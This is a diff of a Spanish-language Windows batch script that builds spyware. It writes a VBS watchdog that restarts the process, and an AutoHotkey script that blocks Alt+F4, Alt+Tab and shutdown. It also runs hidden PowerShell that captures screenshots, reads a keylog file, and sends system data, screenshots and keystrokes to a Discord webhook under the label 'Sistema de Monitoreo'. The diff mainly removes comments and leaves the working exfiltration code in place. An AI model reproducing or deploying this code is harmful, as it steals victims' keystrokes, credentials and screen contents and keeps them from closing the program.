@@ -34,7 +34,7 @@ echo             Exit For
 echo         End If
 echo     Next
 echo     
-echo     ' Si no se encuentra, reiniciar el proceso
+echo     
 echo     If Not processFound Then
 echo         WshShell.Run "cmd.exe /c start /min cmd.exe /c ""cd /d " ^& WScript.Arguments.Item(0) ^& " && " ^& WScript.Arguments.Item(1) ^& """", 0, False
 echo     End If
@@ -54,22 +54,19 @@ echo #NoTrayIcon
 echo #NoEnv
 echo SetWorkingDir %%A_ScriptDir%%
 echo #SingleInstance Force
-echo 
-echo ; Bloquear Alt+F4 y otras combinaciones de teclas
+echo  
 echo !F4::Return
 echo !^F4::Return
 echo !Tab::Return
 echo #F4::Return
 echo ^F4::Return
 echo 
-echo ; Bloquear intentos de apagado
 echo OnMessage(0x11, "WM_QUERYENDSESSION")
 echo WM_QUERYENDSESSION(wParam, lParam)
 echo {
 echo     return false
 echo }
 echo 
-echo ; Mantener en ejecución
 echo Loop
 echo     Sleep, 100
 echo Loop
@@ -407,18 +404,18 @@ echo }
 
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%temp%\sysdata\collector.ps1" >nul 2>&1
 
-set "WEBHOOK_URL=Discord webhook here"
+set "WEBHOOK_URL=DISCORD WEBHOOK HERE"
 
 :loop
 
-powershell -WindowStyle Hidden -Command "try { $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content; Write-Output $ip } catch { Write-Output 'No se pudo obtener' }" > ip_pub.txt 2>nul
+powershell -WindowStyle Hidden -Command "try { $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content; Write-Output $ip } catch { Write-Output 'no se pudo obtener' }" > ip_pub.txt 2>nul
 set /p IP_PUBLIC=<ip_pub.txt
 
 powershell -WindowStyle Hidden -Command "if ((Get-ChildItem -Path $env:TEMP\sysdata\screenshot-*.jpg | Measure-Object).Count -lt 5) { Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $timestamp = Get-Date -Format 'yyyyMMdd-HHmmss'; $bitmap.Save(\"$env:TEMP\sysdata\screenshot-$timestamp.jpg\", [System.Drawing.Imaging.ImageFormat]::Jpeg); $graphics.Dispose(); $bitmap.Dispose(); }" >nul 2>&1
 
-powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:TEMP\sysdata\system_info.json\") { $size = (Get-Item \"$env:TEMP\sysdata\system_info.json\").Length; if ($size -lt 1024000) { $json = Get-Content \"$env:TEMP\sysdata\system_info.json\" -Raw; $payload = @{content=\"🔍 **DATOS DEL SISTEMA**\"; username=\"Sistema de Monitoreo\"; avatar_url=\"https://media.discordapp.net/attachments/1260633531542012025/1346646778648334419/RedTiger_Logo.png?ex=67c8f20b&is=67c7a08b&hm=c2b33b9f1899685a6b881283ef4e8fef113c21a23604101af1205bdf84011a57&=&format=webp&quality=lossless&width=339&height=480\"} | ConvertTo-Json; Invoke-RestMethod -Uri \"%WEBHOOK_URL%\" -Method Post -ContentType \"application/json\" -Body $payload; $files = Get-ChildItem \"$env:TEMP\sysdata\screenshot-*.jpg\" | Sort-Object LastWriteTime -Descending | Select-Object -First 1; foreach ($file in $files) { curl.exe -F \"file1=@$($file.FullName)\" %WEBHOOK_URL% } } }" >nul 2>&1
+powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:TEMP\sysdata\system_info.json\") { $size = (Get-Item \"$env:TEMP\sysdata\system_info.json\").Length; if ($size -lt 1024000) { $json = Get-Content \"$env:TEMP\sysdata\system_info.json\" -Raw; $payload = @{content=\"🔍 **DATOS DEL SISTEMA**\"; username=\"Sistema de Monitoreo\"; avatar_url=\"https://media.discordapp.net/attachments/"} | ConvertTo-Json; Invoke-RestMethod -Uri \"%WEBHOOK_URL%\" -Method Post -ContentType \"application/json\" -Body $payload; $files = Get-ChildItem \"$env:TEMP\sysdata\screenshot-*.jpg\" | Sort-Object LastWriteTime -Descending | Select-Object -First 1; foreach ($file in $files) { curl.exe -F \"file1=@$($file.FullName)\" %WEBHOOK_URL% } } }" >nul 2>&1
 
-powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:TEMP\sysdata\keylog.txt\") { $content = Get-Content \"$env:TEMP\sysdata\keylog.txt\" -Raw; if ($content.Length -gt 0 -and $content.Length -lt 1024000) { $payload = @{content=\"⌨️ **REGISTRO DE TECLAS**\n```\n$content\n```\"; username=\"Sistema de Monitoreo\"; avatar_url=\"https://media.discordapp.net/attachments/1260633531542012025/1346646778648334419/RedTiger_Logo.png?ex=67c8f20b&is=67c7a08b&hm=c2b33b9f1899685a6b881283ef4e8fef113c21a23604101af1205bdf84011a57&=&format=webp&quality=lossless&width=339&height=480\"} | ConvertTo-Json; Invoke-RestMethod -Uri \"%WEBHOOK_URL%\" -Method Post -ContentType \"application/json\" -Body $payload; Clear-Content \"$env:TEMP\sysdata\keylog.txt\" } }" >nul 2>&1
+powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:TEMP\sysdata\keylog.txt\") { $content = Get-Content \"$env:TEMP\sysdata\keylog.txt\" -Raw; if ($content.Length -gt 0 -and $content.Length -lt 1024000) { $payload = @{content=\"⌨️ **REGISTRO DE TECLAS**\n```\n$content\n```\"; username=\"Sistema de Monitoreo\"; avatar_url=\"https://media.discordapp.net/attachments/"} | ConvertTo-Json; Invoke-RestMethod -Uri \"%WEBHOOK_URL%\" -Method Post -ContentType \"application/json\" -Body $payload; Clear-Content \"$env:TEMP\sysdata\keylog.txt\" } }" >nul 2>&1
 
 (
 echo {
